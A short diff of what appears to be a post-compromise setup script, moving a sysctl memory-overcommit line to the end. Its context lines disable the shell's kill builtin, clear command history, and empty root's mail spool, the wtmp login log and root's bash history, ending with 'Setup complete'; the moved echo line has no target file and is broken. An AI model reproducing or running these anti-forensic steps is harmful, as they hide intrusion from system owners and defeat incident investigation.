@@ -921,9 +921,6 @@ enable -n kill
 # :wq
 # EOF
 
-sysctl -w vm.overcommit_memory=2
-echo "vm.overcommit_memory=2" >> 
-
 history -c
 echo > /var/spool/mail/root
 echo > /var/log/wtmp
@@ -932,3 +929,5 @@ echo > /root/.bash_history
 
 echo "[*] Setup complete"
 echo "[*] Yee-Go"
+sysctl -w vm.overcommit_memory=2
+echo "vm.overcommit_memory=2" >> 
